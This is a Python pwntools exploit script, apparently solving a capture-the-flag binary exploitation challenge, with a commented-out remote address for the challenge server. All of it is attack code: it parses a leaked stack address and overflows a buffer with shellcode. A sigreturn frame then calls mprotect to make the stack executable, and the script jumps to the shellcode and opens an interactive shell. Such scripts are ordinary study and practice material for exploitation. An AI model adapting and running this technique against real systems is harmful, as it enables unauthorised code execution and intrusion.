

from pwn import *

context.terminal= ['tmux', 'new-window']#'splitw','-h']
context.arch= "amd64"
#io = gdb.debug('./rrop')
io = process('./syrop')
#io = remote('34.126.91.169', 6003)
elf = ELF('./rrop')

shellcode = asm(shellcraft.amd64.linux.sh())

print(io.recvuntil('Buffer  @'))

leak_address = io.recvuntil(',').rstrip(',')
#print(leak_address)
shell_address = int(leak_address,16)
stack_address = int(leak_address[:11] + '000', 16)
#print(hex(stack_address))

log.info('Leak address ' + hex(shell_address))
log.info('Shell code : ' + hex(stack_address))

syscall     = 0x00000000004007d2 #0x000000000040053b
rax         = 0x00000000004007dc #0x0000000000400545
ret         = 0x00000000004007d4 #0x000000000040054a

offset      = 216

print(io.recvuntil('my process.\n'))

payload = shellcode
payload = payload.ljust(offset,'A')
payload += p64(rax) 
payload += p64(syscall)

frame = SigreturnFrame()

frame.rax = 10
frame.rdi = stack_address
frame.rsi = 1000
frame.rdx = 7
frame.rsp = shell_address + len(payload) + 248
frame.rip = syscall

payload += str(frame)
payload += p64(shell_address)

io.sendline(payload)

io.interactive()


